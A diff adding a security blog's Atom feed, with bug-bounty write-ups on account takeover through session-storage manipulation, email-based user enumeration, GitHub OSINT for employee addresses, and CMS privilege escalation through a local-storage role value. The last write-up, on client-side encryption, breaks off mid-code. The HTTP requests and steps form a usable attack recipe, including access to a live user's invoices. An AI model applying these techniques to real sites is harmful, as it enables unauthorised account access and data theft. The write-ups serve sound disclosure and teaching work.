@@ -1,0 +1,1132 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2023-04-08T15:09:05+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Naveen J</title><subtitle>A blog about IT-Security and related stuff.</subtitle><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><entry><title type="html">Account Takeover via manipulating Session Storage</title><link href="http://localhost:4000/Account_Takeover-via-session-storage/" rel="alternate" type="text/html" title="Account Takeover via manipulating Session Storage" /><published>2023-04-01T12:00:00+00:00</published><updated>2023-04-01T12:00:00+00:00</updated><id>http://localhost:4000/Account_Takeover-via-session-storage</id><content type="html" xml:base="http://localhost:4000/Account_Takeover-via-session-storage/"><![CDATA[<h1 id="target-background">Target Background</h1>
+<p>A Web application which can be used for financial purposes, in which we can generate the invoice, track and reconcile them. And the payments can be done for the invoices and money can be managed completely through the application	.</p>
+
+<h2 id="overview">Overview</h2>
+<p>I have created a test account through the sign up functionality in the application and after logging in, the application have asked to create an organization so we can provide access to our team members and assign them a particular roles based on how they have to play in the application.</p>
+
+<h2 id="recon">Recon</h2>
+<ul>
+  <li>reactJS</li>
+  <li>Akami Firewall</li>
+  <li>REST APIs</li>
+  <li>Cookie Authentication</li>
+</ul>
+
+<h2 id="user-enumeration">User Enumeration</h2>
+<p>At the login page after entering the username and password of my signed up user credentials the application sends a request to an API endpoint like below to verify whether the user is part of the organization, user exists in the DB or not.</p>
+
+<h3 id="request">Request</h3>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/api/v1/user?email=nj@tvhsecurity.com</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+</code></pre></div></div>
+
+<h3 id="response">Response</h3>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK </span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 29 Mar 2023 05:59:48 GMT </span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Express </span>
+<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">* </span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json; charset=utf-8 </span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">370 ETag: W/"172-rQhbOJIDRtY57xxDgEWDAhUpziE" </span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...; Path=/; HttpOnly </span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN </span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff </span>
+<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block </span>
+<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">strict-origin-when-cross-origin </span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close </span>
+<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=31536000; includeSubDomains</span>
+
+<span class="p">{</span><span class="w">
+  </span><span class="nl">"status"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Successfully Retrieved"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"result"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"UserId"</span><span class="p">:</span><span class="mi">601</span><span class="err">███</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"EmailId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"nj@tvhsecurity.com"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"RegionId"</span><span class="p">:</span><span class="w"> </span><span class="mi">160</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"RegionName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"IN"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"CountryId"</span><span class="p">:</span><span class="w"> </span><span class="mi">26</span><span class="err">█</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"CountryName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"India"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"Status"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Approved"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Naveen J"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"DeliveryCentre"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bangalore, India"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"IsActive"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"SubProcess"</span><span class="p">:</span><span class="w"> </span><span class="s2">"null"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="post-login">Post Login</h2>
+<p>After logging in into the application i was going through the JS files and local storages and found that the session storage which stores the information that was fetched in the response from the above user verify request. The user results are stored exactly how it was fetched from the API response.</p>
+
+<figure>
+<img src="session_storage.png" />
+<figcaption>Fig 1. Local session storage.</figcaption>
+</figure>
+
+<h2 id="theory">Theory</h2>
+<p>My theory was initially to test the session storage once it might be vulnerable as the application is only using the encrypted cookies as authentication. In order to test that theory i need another user account so i have signed up another test account.</p>
+
+<p>Now we have 2 legitimate user accounts and we just have to test out the theory, it will work 100% if the application validates the users based on the session storage key <strong>values</strong>.</p>
+
+<p>The below screenshot shows the session storage of <strong>User1</strong> account.</p>
+
+<figure>
+<img src="Signed_up_user.png" />
+<figcaption>Fig 2. Signed_up_user.</figcaption>
+</figure>
+
+<p>Now i just have to pass the <strong>User2</strong> account email Id in the email verify request and it will provide all the details that i want to do the manipulation.</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/api/v1/user?email=nj+1@tvhsecurity.com</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+</code></pre></div></div>
+
+<p>I have copied the required payload fron the JSON response and changed the session value of the <strong>login</strong> key. After refrshing the page i was able to login into the <strong>User2 account</strong>.</p>
+
+<h3 id="notes-">Notes:-</h3>
+<ul>
+  <li>User1 = nj@tvhsecurity.com</li>
+  <li>User2 = nj+1@tvhsecurity.com</li>
+</ul>
+
+<p>Since both the accounts are fresh accounts i was unable to verify the issue as it is 100% solid, so inorder to verify it i have to make some financial stuffs in the application which was not possible at the moment.</p>
+
+<p>So i decided why not to give a try for a live account. I have to enumerate the users present in the application which is nearly very easy to do all I need is a list of email Ids which belongs to the target organization.</p>
+
+<h2 id="osint">OSINT</h2>
+<p>I have decided to do some OSINT recon on the target and get some email Id. After a while I did find some email Ids of the companies business peoples from the contact pages of the organization but all of them turned out to be a failure.</p>
+
+<h3 id="github-recon">GitHub Recon</h3>
+<p>So i decided to do some recon on github using the dorks and found few email Ids via the issues feature. The peoples from the organization commented few issues to their product/services repository codes.</p>
+
+<figure>
+<img src="github.png" />
+<figcaption>Fig 3. GitHub OSINT recon.</figcaption>
+</figure>
+
+<p>I made a list and sent it to intruder and checked the content lenght, luckily few of them are valid.</p>
+
+<h2 id="verify-user">Verify User</h2>
+
+<h3 id="request-1">Request</h3>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/api/v1/user?email=ba████████@target.com</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">2</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.target.com</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">blah...blah...blah...</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.target.com/</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">iframe</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">navigate</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
+<span class="na">Te</span><span class="p">:</span> <span class="s">trailers</span>
+</code></pre></div></div>
+
+<h3 id="response-1">Response</h3>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK </span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Wed, 29 Mar 2023 05:59:48 GMT </span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">Express </span>
+<span class="na">Access-Control-Allow-Origin</span><span class="p">:</span> <span class="s">* </span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json; charset=utf-8 </span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">370 ETag: W/"172-rQhbOJIDRtY57xxDgEWDAhUpziE" </span>
+<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">; Path=/; HttpOnly </span>
+<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN </span>
+<span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff </span>
+<span class="na">X-XSS-Protection</span><span class="p">:</span> <span class="s">1; mode=block </span>
+<span class="na">Referrer-Policy</span><span class="p">:</span> <span class="s">strict-origin-when-cross-origin </span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close </span>
+<span class="na">Strict-Transport-Security</span><span class="p">:</span> <span class="s">max-age=31536000; includeSubDomains</span>
+
+<span class="p">{</span><span class="w">
+  </span><span class="nl">"status"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"message"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Successfully Retrieved"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"result"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"UserId"</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="err">██</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"EmailId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ba████████@target.com"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"RegionId"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="mi">300</span><span class="p">,</span><span class="w">
+        </span><span class="mi">300</span><span class="w">
+      </span><span class="p">],</span><span class="w">
+      </span><span class="nl">"RegionName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"NA"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"CountryId"</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"CountryName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"United States"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"Status"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Approved"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bane Smith"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"DeliveryCentre"</span><span class="p">:</span><span class="w"> </span><span class="s2">"New York, United States"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"IsActive"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"SubProcess"</span><span class="p">:</span><span class="w"> </span><span class="s2">"null"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="checkpoint">Checkpoint</h2>
+<ul>
+  <li>We have valid user email</li>
+  <li>Details required to maipulate session value</li>
+</ul>
+
+<h3 id="extracted-new-session-value">Extracted new session value</h3>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"UserId"</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span><span class="err">██</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"EmailId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ba████████@target.com"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"RegionId"</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"RegionName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"NA"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"RoleId"</span><span class="p">:</span><span class="w"> </span><span class="mi">100</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"RoleName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Admin"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"CountryId"</span><span class="p">:</span><span class="w"> </span><span class="mi">200</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"CountryName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"United States"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"Status"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Approved"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"Name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bane Smith"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"DeliveryCentre"</span><span class="p">:</span><span class="w"> </span><span class="s2">"New York, United States"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"IsActive"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"SubProcess"</span><span class="p">:</span><span class="w"> </span><span class="s2">"null"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The above is the value that we have to pass in the session storage to test the theory.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+<p>Post successfully passing the extracted legitimate users details in the session storage value and after refreshing the page the application gave me access to that user’s accounts.</p>
+
+<figure>
+<img src="Exploitation.png" />
+<figcaption>Fig 4. Exploitation</figcaption>
+</figure>
+
+<p>As you can see i am able to view the invoices generated in the target user’s account.</p>
+
+<p>Please note that due to the non-disclosure agreement these are the only information i was allowed to share.</p>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="Session Storage" /><category term="Account Takeover" /><category term="Misconfiguration" /><summary type="html"><![CDATA[Taking over other user account via manipulating the local session Storage.]]></summary></entry><entry><title type="html">Hacking MNC’s Content Management System due to misconfiguration and lack of authorization</title><link href="http://localhost:4000/Hacking_MNCs-CMS_Systems/" rel="alternate" type="text/html" title="Hacking MNC’s Content Management System due to misconfiguration and lack of authorization" /><published>2023-03-25T12:00:00+00:00</published><updated>2023-03-25T12:00:00+00:00</updated><id>http://localhost:4000/Hacking_MNCs-CMS_Systems</id><content type="html" xml:base="http://localhost:4000/Hacking_MNCs-CMS_Systems/"><![CDATA[<h2 id="target-background">Target Background</h2>
+<p>The target is a Multi National Company who has a billion dollar market and the stocks. The nature of the application is to create, edit and update the contents of their products/services. Once the content is published the updated contents will be pushed to the live website of the product/services page. Short form it’s a <strong>Content Management System application</strong> - its a own product of the company built using reactJS.</p>
+
+<h2 id="overview">Overview</h2>
+<p>The application does not have any sign up page as this is a CMS application only the administrator of the application can create and assign roles to the users. The home page didn’t have any sign up buttons other than the login form - username, password, submit and forgot password buttons.</p>
+
+<h3 id="recon">Recon</h3>
+<ul>
+  <li>reactJS</li>
+  <li>Amazon CDN</li>
+  <li>REST APIs</li>
+</ul>
+
+<h3 id="analyzing-loaded-source-files">Analyzing loaded source files</h3>
+<p>After analyzing the loaded source files in the application it clearlys shows that the user has to be legitimate to access the application. There were no REST API locations were mentioned in the JS files. The perfect way to proceed further is to fuzz the URL. After fuzzing the URL the signup endpoint were found <strong>https://abc.com/abc/xyz/signup.html</strong>.</p>
+
+<h2 id="misconfiguration---1">Misconfiguration - 1</h2>
+<h3 id="sign-up">Sign up</h3>
+<p>Since the application does not have the signup option in the home page and the same has been configured in the different directory than the home login page. The developer might be intentionally did it or might have used it for internal purpose or forgot to remove from the directory.</p>
+
+<p>I have signed up an account, and luckily it doesn’t ask to confirm the information provided like email confirmation to create an account sccessfully.</p>
+
+<p>After creating a user successfully, i have tried to login to the application but since the signed up user is not a legitmate user and no roles have been assigned to it, the application kept redirecting me to login page. The application contents were not accessible. But I was able to extract the embeded REST API locations from the page because we are able to login to the application but only the application pages are not available in the UI due to incorrect permissions.</p>
+
+<p>So i have decided to circle back to the login request to understand the flow and what we are missing, after successfull login the application serves the authorization token (JWT) in the Location header along with the URL. I was able to decode the JWT and it doesn’t has any values for the cognito permission which solve the question why the contents are unavailable.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"at_hash"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ry3UaTl8rD1IPBffLSyQ7w"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"sub"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e03f561e-9392-437d-abf7-48715fde4a4e"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"cognito:groups"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="s2">""</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"iss"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://cognito-idp.abc.com"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"cognito:username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"test"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"origin_jti"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"cognito:roles"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="s2">""</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"aud"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2kp93i4kj1ump55lid961qm7bv"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"event_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"65f7336b-1b89-45e6-b9f9-be466f24207b"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"token_use"</span><span class="p">:</span><span class="w"> </span><span class="s2">"id"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"auth_time"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"phone_number"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"exp"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"iat"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"jti"</span><span class="p">:</span><span class="w"> </span><span class="s2">"66d3189d-e26e-454f-9b8d-7863ac4de102"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"nj@tvhsecurity.com"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>After decoding the JWT, it showed that the user doesn’t have any assigned roles to access the application pages.</p>
+
+<h3 id="fuzzing-jwt">Fuzzing JWT</h3>
+<p>In order to find the right <code class="language-plaintext highlighter-rouge">cognito groups</code> we have to fuzz the JWT payload but by adding random role permissions keywords, encoding it and sending it in the request turned to be a failure.</p>
+
+<p>But with the token i was able to download page source through curl by passing the <strong>authorization header</strong>. After downloading the page source i have used one of my own oneliners to extract the URL locations embeded in the application and I was able to successfull get a few static pages and REST API paths. We can also the <a href="https://github.com/thevillagehacker/urlscrapy">URLScrapy</a> a tool to extract the embeded location in the web page.</p>
+
+<h2 id="http-response-code">HTTP response code</h2>
+<p>I have placed all of the extracted URLs in a text file and used <strong><a href="https://github.com/projectdiscovery/httpx">HTTPX</a></strong> to check the status code and content length, luckily one of the page returned with different content length. After visiting the page it showed some static contents about the user role in the application.</p>
+
+<p>So with the help of that recon i knew there are 2 user roles in the application which are <code class="language-plaintext highlighter-rouge">editor</code> and <code class="language-plaintext highlighter-rouge">publisher</code>. The editor user can edit the contents and pubshier can approve those new contents.</p>
+
+<h2 id="checkpoint">Checkpoint</h2>
+<p>Let’s check what do we have as of now to access the application contents.</p>
+
+<ul>
+  <li>Newly signup account without any roles</li>
+  <li>user roles in the application</li>
+  <li>Working JWT token (Authorization)</li>
+</ul>
+
+<p>Alright! now we have to find a way to assign the user roles to the token and access the application contents. After playing with dev-tools for a while i have noticed there is a variable in the local storage <code class="language-plaintext highlighter-rouge">user_role</code> which is empty by the way for our user account. So i have set an value as <code class="language-plaintext highlighter-rouge">editor</code> and refreshed the page.</p>
+
+<p>Voila! the application is checking the local storage variables as well to serve the content of the application, I was able to add and edit application contents.</p>
+
+<h2 id="misconfiguration---2">Misconfiguration - 2</h2>
+<p>Now we are able to access the application which concludes that the application is using aws cognito groups as authentication only and it was not used for authorization because we were able to become an editor user in the application by adding value as <code class="language-plaintext highlighter-rouge">editor</code> to the local storage variable <code class="language-plaintext highlighter-rouge">user_role</code>.</p>
+
+<p>So we only need an legitimate authentication token to access the REST APIs, since the authorization is not implemented.</p>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>I have escalated the privilege of <code class="language-plaintext highlighter-rouge">publisher</code> user by changing the local storage variable <code class="language-plaintext highlighter-rouge">user_role</code> to <code class="language-plaintext highlighter-rouge">publisher</code>. After refreshing the page i was able to access the publisher contents pages in which we can approve and reject contents which have been added by the editor users in the application.</p>
+
+<p>Please note that due to the non-disclosure agreement these are the only information i was allowed to share.</p>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="Reading Js files" /><category term="Privilege Escalation" /><category term="Fuzzing" /><category term="Misconfiguration" /><summary type="html"><![CDATA[Hacking MNC's Content Management System due to misconfiguration and lack of authorization in the application.]]></summary></entry><entry><title type="html">Reverse Engineering Client side Encryption</title><link href="http://localhost:4000/reversing-client-side-encryption/" rel="alternate" type="text/html" title="Reverse Engineering Client side Encryption" /><published>2023-02-18T12:00:00+00:00</published><updated>2023-02-18T12:00:00+00:00</updated><id>http://localhost:4000/reversing%20client%20side%20encryption</id><content type="html" xml:base="http://localhost:4000/reversing-client-side-encryption/"><![CDATA[<h2 id="target-background">Target Background</h2>
+<p>Target is a web application but the same can be accessed via mobile applications as well including both android and iOS apps. The target application has a centralized CDN system which clearly shows that the target has several application with similar features and the resources served are almost same. By doing subdomain enumeration the target has more than 15 application has the same tech and all of them are served by the Amazon CDN.</p>
+
+<h2 id="overview">Overview</h2>
+<p>Recon is the most important thing in finding bugs in the wide targets. While doing recon i came up with the situation which is the application has been developed to encrypt all the communication. The application is using the REST API service and the host value in the REST API calls have different subdomain. All the data body in the request and response has been coded in a way to encrypt to make sure the comms is secured. But as far as the developer decided to hardcode the encryption keys and Initialization vectors in the client side code the application is never secured even it’s coded to provide an encrypted connection.</p>
+
+<h2 id="recon">Recon</h2>
+<ul>
+  <li>Check the technology stack - ReactJS</li>
+  <li>CDN - Amazon CDN</li>
+  <li>API service - REST API</li>
+  <li>REST API host is different than actual application URL</li>
+  <li>Check the sources that has been loaded in the debugger/sources tab in the browser dev tools</li>
+  <li>Check the REST API comms, authorization mechanism and encryptions</li>
+</ul>
+
+<h2 id="analyzing-loaded-sources">Analyzing loaded sources</h2>
+<p>As far as we know the target has a wide scope and they have same CDN system with almost similar code. And the REST API JSON bodies are encrypted so if we find a way to reverse engineer the client side encryption that will possibly lead us to exploit more vulnerablities.</p>
+
+<p><strong>Target - abc.com</strong><br />
+When the application is loaded in the browser it loads the web resources from another subdomain <code class="language-plaintext highlighter-rouge">assets.abc.com</code>. It would be the good idea to check the JS files other than the chunk files which are generated by the frameworks.</p>
+
+<h3 id="files-found">Files found</h3>
+<ul>
+  <li>booking.js</li>
+  <li>desktop.js</li>
+  <li>home.js</li>
+  <li>search.js</li>
+  <li>signin.js</li>
+  <li>signup.js</li>
+  <li>main.js</li>
+</ul>
+
+<p>By going through all the js files to check for keywords like <code class="language-plaintext highlighter-rouge">enc, encrypt, key, IV, initialization, vector</code> found nothing. But when i checked the <strong>main.js</strong> file i came up with few handy details which was worth checking for.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">91622</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
+      <span class="dl">'</span><span class="s1">use strict</span><span class="dl">'</span><span class="p">;</span>
+      <span class="nx">t</span><span class="p">.</span><span class="nx">Z</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="na">apiDomain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://api.abc.com</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">adminDomain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://admin.abc.com</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">searchApiDomain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://search.abc.com</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">searchApiDomain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://search.abc.com</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">preprodApiDomain</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://preprod.abc.com</span><span class="dl">'</span><span class="p">,</span>
